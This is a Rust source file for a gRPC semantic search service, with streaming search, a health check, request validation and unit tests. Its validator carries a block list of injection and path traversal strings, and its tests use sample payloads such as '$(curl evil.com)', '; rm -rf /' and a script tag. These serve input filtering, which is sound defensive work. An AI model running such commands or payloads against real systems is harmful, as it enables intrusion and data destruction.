use std::sync::Arc;
use tokio_stream::wrappers::ReceiverStream;
use tonic::{Request, Response, Status};
use tracing::{info, error, warn};

use crate::error::{SearchError, SearchResult};
use crate::search::SearchService;

// Simplified gRPC types for this implementation
// In production, these would be generated from protobuf files

#[derive(Debug, Clone)]
pub struct GrpcSearchRequest {
    pub query: String,
    pub k: u32,
    pub min_score: Option<f32>,
    pub rerank: bool,
    pub filters: Option<GrpcSearchFilters>,
}

#[derive(Debug, Clone)]
pub struct GrpcSearchFilters {
    pub language: Option<String>,
    pub frozen: Option<bool>,
}

#[derive(Debug, Clone)]
pub struct GrpcSearchResponse {
    pub post_id: String,
    pub title: String,
    pub snippet: String,
    pub score: f32,
    pub meta: Option<GrpcPostMetadata>,
}

#[derive(Debug, Clone)]
pub struct GrpcPostMetadata {
    pub author_name: String,
    pub url: String,
    pub date: String,
    pub language: String,
    pub frozen: bool,
}

#[derive(Debug, Clone)]
pub struct HealthCheckRequest {
    pub service: String,
}

#[derive(Debug, Clone)]
pub struct HealthCheckResponse {
    pub status: i32,
    pub message: String,
    pub timestamp: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(i32)]
pub enum HealthStatus {
    Unknown = 0,
    Serving = 1,
    NotServing = 2,
    ServiceUnknown = 3,
}

/// gRPC service implementation
pub struct GrpcSearchService {
    search_service: Arc<SearchService>,
}

impl GrpcSearchService {
    /// Create a new gRPC service instance
    pub fn new(search_service: Arc<SearchService>) -> Self {
        Self { search_service }
    }

    /// Perform streaming semantic search
    pub async fn semantic_search_stream(
        &self,
        request: GrpcSearchRequest,
    ) -> Result<ReceiverStream<Result<GrpcSearchResponse, Status>>, Status> {
        info!(
            "gRPC semantic search request: query='{}', k={}, rerank={}",
            request.query, request.k, request.rerank
        );

        // Validate the gRPC request
        if let Err(validation_error) = validate_grpc_search_request(&request) {
            warn!("Invalid gRPC request: {}", validation_error);
            return Err(Status::invalid_argument(validation_error));
        }

        // Convert gRPC request to internal request format
        let internal_request = match convert_grpc_to_internal_request(request) {
            Ok(req) => req,
            Err(e) => {
                error!("Failed to convert gRPC request: {}", e);
                return Err(Status::internal("Request conversion failed"));
            }
        };

        // Create a channel for streaming responses
        let (tx, rx) = tokio::sync::mpsc::channel(128);

        // Clone the search service for the async task
        let search_service = self.search_service.clone();

        // Spawn async task to perform search and stream results
        tokio::spawn(async move {
            match search_service.semantic_search(internal_request).await {
                Ok(results) => {
                    info!("gRPC search completed successfully: {} results", results.len());
                    
                    // Stream each result individually
                    for result in results {
                        let grpc_response = convert_internal_to_grpc_response(result);
                        
                        if let Err(_) = tx.send(Ok(grpc_response)).await {
                            // Client disconnected, stop streaming
                            warn!("gRPC client disconnected during streaming");
                            break;
                        }
                        
                        // Add small delay between results to demonstrate streaming
                        // In production, this could be removed or made configurable
                        tokio::time::sleep(tokio::time::Duration::from_millis(1)).await;
                    }
                }
                Err(e) => {
                    error!("gRPC search failed: {}", e);
                    
                    // Convert search error to gRPC status
                    let status = convert_search_error_to_grpc_status(e);
                    
                    if let Err(_) = tx.send(Err(status)).await {
                        warn!("Failed to send error to gRPC client");
                    }
                }
            }
        });

        // Return the streaming response
        Ok(ReceiverStream::new(rx))
    }

    /// Health check endpoint
    pub async fn health_check(
        &self,
        request: HealthCheckRequest,
    ) -> Result<HealthCheckResponse, Status> {
        info!("gRPC health check request for service: '{}'", request.service);

        // Perform health check on the search service
        let health_result = self.search_service.health_check().await;
        
        let (status, message) = match health_result {
            Ok(_) => (HealthStatus::Serving, "Service is healthy".to_string()),
            Err(e) => {
                warn!("Health check failed: {}", e);
                (HealthStatus::NotServing, format!("Service unhealthy: {}", e))
            }
        };

        let response = HealthCheckResponse {
            status: status as i32,
            message,
            timestamp: chrono::Utc::now().to_rfc3339(),
        };

        Ok(response)
    }
}

/// Validate gRPC search request
fn validate_grpc_search_request(request: &GrpcSearchRequest) -> Result<(), String> {
    // Validate query
    if request.query.is_empty() {
        return Err("Query cannot be empty".to_string());
    }
    
    if request.query.len() > 1000 {
        return Err("Query too long (maximum 1000 characters allowed)".to_string());
    }
    
    // Enhanced security checks for malicious content
    if contains_malicious_patterns(&request.query) {
        return Err("Query contains potentially malicious content".to_string());
    }
    
    // Validate k parameter
    if request.k == 0 {
        return Err("Parameter 'k' must be greater than 0".to_string());
    }
    
    if request.k > 50 {
        return Err("Parameter 'k' must not exceed 50".to_string());
    }
    
    // Validate min_score parameter
    if let Some(score) = request.min_score {
        if score < 0.0 || score > 1.0 {
            return Err("Parameter 'min_score' must be between 0.0 and 1.0".to_string());
        }
        
        if score.is_nan() || score.is_infinite() {
            return Err("Parameter 'min_score' must be a valid number".to_string());
        }
    }
    
    // Validate filters
    if let Some(filters) = &request.filters {
        if let Some(language) = &filters.language {
            if language.is_empty() || language.len() > 10 {
                return Err("Language filter must be 1-10 characters".to_string());
            }
            
            // Enhanced language code validation
            if !is_valid_language_code(language) {
                return Err("Language filter contains invalid characters or format".to_string());
            }
        }
    }
    
    Ok(())
}

/// Check for malicious patterns in input text (reused from HTTP server)
fn contains_malicious_patterns(text: &str) -> bool {
    // Check for null bytes and control characters
    if text.contains('\0') || text.chars().any(|c| c.is_control() && c != '\t' && c != '\n' && c != '\r') {
        return true;
    }
    
    // Check for common injection patterns
    let malicious_patterns = [
        // SQL injection patterns
        "'; DROP TABLE",
        "'; DELETE FROM",
        "'; INSERT INTO",
        "'; UPDATE ",
        "UNION SELECT",
        "OR 1=1",
        "AND 1=1",
        
        // NoSQL injection patterns
        "$where",
        "$ne",
        "$gt",
        "$lt",
        "$regex",
        
        // Script injection patterns
        "<script",
        "javascript:",
        "vbscript:",
        "onload=",
        "onerror=",
        
        // Command injection patterns
        "; rm -rf",
        "; cat /etc",
        "$(curl",
        "`curl",
        "&& curl",
        "| curl",
        
        // Path traversal patterns
        "../",
        "..\\",
        "/etc/passwd",
        "/proc/",
        "\\windows\\",
    ];
    
    let text_lower = text.to_lowercase();
    for pattern in &malicious_patterns {
        if text_lower.contains(&pattern.to_lowercase()) {
            warn!("Detected malicious pattern '{}' in gRPC input", pattern);
            return true;
        }
    }
    
    // Check for excessive special characters (potential obfuscation)
    let special_char_count = text.chars().filter(|c| !c.is_alphanumeric() && !c.is_whitespace()).count();
    let special_char_ratio = special_char_count as f32 / text.len() as f32;
    
    if special_char_ratio > 0.3 {
        warn!("gRPC input has suspicious special character ratio: {:.2}", special_char_ratio);
        return true;
    }
    
    false
}

/// Validate language code format (reused from HTTP server)
fn is_valid_language_code(language: &str) -> bool {
    // Check basic format (2-10 characters, lowercase letters and hyphens only)
    if language.len() < 2 || language.len() > 10 {
        return false;
    }
    
    // Allow lowercase letters and hyphens (for codes like "en-US")
    language.chars().all(|c| c.is_ascii_lowercase() || c == '-')
}

/// Convert gRPC request to internal request format
fn convert_grpc_to_internal_request(grpc_request: GrpcSearchRequest) -> SearchResult<crate::types::SearchRequest> {
    let filters = grpc_request.filters.map(|f| crate::types::SearchFilters {
        language: f.language,
        frozen: f.frozen,
    });

    Ok(crate::types::SearchRequest {
        query: grpc_request.query,
        k: grpc_request.k,
        min_score: grpc_request.min_score,
        rerank: grpc_request.rerank,
        filters,
    })
}

/// Convert internal response to gRPC response format
fn convert_internal_to_grpc_response(internal_response: crate::types::SearchResponse) -> GrpcSearchResponse {
    GrpcSearchResponse {
        post_id: internal_response.post_id,
        title: internal_response.title,
        snippet: internal_response.snippet,
        score: internal_response.score,
        meta: Some(GrpcPostMetadata {
            author_name: internal_response.meta.author_name,
            url: internal_response.meta.url,
            date: internal_response.meta.date.to_rfc3339(),
            language: internal_response.meta.language,
            frozen: internal_response.meta.frozen,
        }),
    }
}

/// Convert search error to gRPC status
fn convert_search_error_to_grpc_status(error: SearchError) -> Status {
    match error {
        SearchError::ModelError(msg) => Status::unavailable(format!("ML service unavailable: {}", msg)),
        SearchError::RedisError(msg) => Status::unavailable(format!("Cache service unavailable: {}", msg)),
        SearchError::DatabaseError(msg) => Status::unavailable(format!("Database service unavailable: {}", msg)),
        SearchError::ConfigError(msg) => Status::internal(format!("Configuration error: {}", msg)),
        SearchError::Internal(msg) => Status::internal(format!("Internal error: {}", msg)),
        _ => Status::internal("Unknown error occurred"),
    }
}

mod integration_tests;

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::{SearchFilters, PostMetadata};
    use chrono::Utc;

    #[test]
    fn test_validate_grpc_search_request_valid() {
        let request = GrpcSearchRequest {
            query: "test query".to_string(),
            k: 10,
            min_score: Some(0.5),
            rerank: false,
            filters: None,
        };
        
        assert!(validate_grpc_search_request(&request).is_ok());
    }

    #[test]
    fn test_validate_grpc_search_request_empty_query() {
        let request = GrpcSearchRequest {
            query: "".to_string(),
            k: 10,
            min_score: None,
            rerank: false,
            filters: None,
        };
        
        let result = validate_grpc_search_request(&request);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Query cannot be empty"));
    }

    #[test]
    fn test_validate_grpc_search_request_query_too_long() {
        let request = GrpcSearchRequest {
            query: "a".repeat(1001),
            k: 10,
            min_score: None,
            rerank: false,
            filters: None,
        };
        
        let result = validate_grpc_search_request(&request);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Query too long"));
    }

    #[test]
    fn test_validate_grpc_search_request_invalid_k_zero() {
        let request = GrpcSearchRequest {
            query: "test".to_string(),
            k: 0,
            min_score: None,
            rerank: false,
            filters: None,
        };
        
        let result = validate_grpc_search_request(&request);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("must be greater than 0"));
    }

    #[test]
    fn test_validate_grpc_search_request_invalid_k_too_large() {
        let request = GrpcSearchRequest {
            query: "test".to_string(),
            k: 51,
            min_score: None,
            rerank: false,
            filters: None,
        };
        
        let result = validate_grpc_search_request(&request);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("must not exceed 50"));
    }

    #[test]
    fn test_validate_grpc_search_request_invalid_min_score() {
        let request = GrpcSearchRequest {
            query: "test".to_string(),
            k: 10,
            min_score: Some(-0.1),
            rerank: false,
            filters: None,
        };
        
        let result = validate_grpc_search_request(&request);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("must be between 0.0 and 1.0"));
    }

    #[test]
    fn test_validate_grpc_search_request_malicious_query() {
        let request = GrpcSearchRequest {
            query: "test'; DROP TABLE users;".to_string(),
            k: 10,
            min_score: None,
            rerank: false,
            filters: None,
        };
        
        let result = validate_grpc_search_request(&request);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("malicious"));
    }

    #[test]
    fn test_convert_grpc_to_internal_request() {
        let grpc_request = GrpcSearchRequest {
            query: "test query".to_string(),
            k: 10,
            min_score: Some(0.5),
            rerank: true,
            filters: Some(GrpcSearchFilters {
                language: Some("en".to_string()),
                frozen: Some(false),
            }),
        };
        
        let internal_request = convert_grpc_to_internal_request(grpc_request).unwrap();
        
        assert_eq!(internal_request.query, "test query");
        assert_eq!(internal_request.k, 10);
        assert_eq!(internal_request.min_score, Some(0.5));
        assert!(internal_request.rerank);
        
        let filters = internal_request.filters.unwrap();
        assert_eq!(filters.language, Some("en".to_string()));
        assert_eq!(filters.frozen, Some(false));
    }

    #[test]
    fn test_convert_internal_to_grpc_response() {
        let internal_response = crate::types::SearchResponse {
            post_id: "test_post".to_string(),
            title: "Test Title".to_string(),
            snippet: "Test snippet".to_string(),
            score: 0.85,
            meta: PostMetadata {
                author_name: "Test Author".to_string(),
                url: "https://example.com/test".to_string(),
                date: Utc::now(),
                language: "en".to_string(),
                frozen: false,
            },
        };
        
        let grpc_response = convert_internal_to_grpc_response(internal_response);
        
        assert_eq!(grpc_response.post_id, "test_post");
        assert_eq!(grpc_response.title, "Test Title");
        assert_eq!(grpc_response.snippet, "Test snippet");
        assert_eq!(grpc_response.score, 0.85);
        
        let meta = grpc_response.meta.unwrap();
        assert_eq!(meta.author_name, "Test Author");
        assert_eq!(meta.url, "https://example.com/test");
        assert_eq!(meta.language, "en");
        assert!(!meta.frozen);
    }

    #[test]
    fn test_convert_search_error_to_grpc_status() {
        let model_error = SearchError::ModelError("Model failed".to_string());
        let status = convert_search_error_to_grpc_status(model_error);
        assert_eq!(status.code(), tonic::Code::Unavailable);
        assert!(status.message().contains("ML service unavailable"));
        
        let redis_error = SearchError::RedisError("Redis failed".to_string());
        let status = convert_search_error_to_grpc_status(redis_error);
        assert_eq!(status.code(), tonic::Code::Unavailable);
        assert!(status.message().contains("Cache service unavailable"));
        
        let db_error = SearchError::DatabaseError("DB failed".to_string());
        let status = convert_search_error_to_grpc_status(db_error);
        assert_eq!(status.code(), tonic::Code::Unavailable);
        assert!(status.message().contains("Database service unavailable"));
        
        let config_error = SearchError::ConfigError("Config failed".to_string());
        let status = convert_search_error_to_grpc_status(config_error);
        assert_eq!(status.code(), tonic::Code::Internal);
        assert!(status.message().contains("Configuration error"));
        
        let internal_error = SearchError::Internal("Internal failed".to_string());
        let status = convert_search_error_to_grpc_status(internal_error);
        assert_eq!(status.code(), tonic::Code::Internal);
        assert!(status.message().contains("Internal error"));
    }

    #[test]
    fn test_contains_malicious_patterns() {
        // Test SQL injection patterns
        assert!(contains_malicious_patterns("'; DROP TABLE users;"));
        assert!(contains_malicious_patterns("UNION SELECT * FROM"));
        assert!(contains_malicious_patterns("OR 1=1"));
        
        // Test script injection patterns
        assert!(contains_malicious_patterns("<script>alert('xss')</script>"));
        assert!(contains_malicious_patterns("javascript:alert(1)"));
        
        // Test command injection patterns
        assert!(contains_malicious_patterns("; rm -rf /"));
        assert!(contains_malicious_patterns("$(curl evil.com)"));
        
        // Test path traversal patterns
        assert!(contains_malicious_patterns("../../../etc/passwd"));
        assert!(contains_malicious_patterns("\\windows\\system32"));
        
        // Test null bytes
        assert!(contains_malicious_patterns("test\0query"));
        
        // Test valid queries
        assert!(!contains_malicious_patterns("normal search query"));
        assert!(!contains_malicious_patterns("how to use SQL properly"));
        assert!(!contains_malicious_patterns("javascript programming tutorial"));
    }

    #[test]
    fn test_is_valid_language_code() {
        // Valid language codes
        assert!(is_valid_language_code("en"));
        assert!(is_valid_language_code("es"));
        assert!(is_valid_language_code("en-us"));
        assert!(is_valid_language_code("zh-cn"));
        
        // Invalid language codes
        assert!(!is_valid_language_code(""));
        assert!(!is_valid_language_code("e"));
        assert!(!is_valid_language_code("EN")); // uppercase
        assert!(!is_valid_language_code("en_US")); // underscore
        assert!(!is_valid_language_code("en123")); // numbers
        assert!(!is_valid_language_code("toolongcode")); // too long
    }
}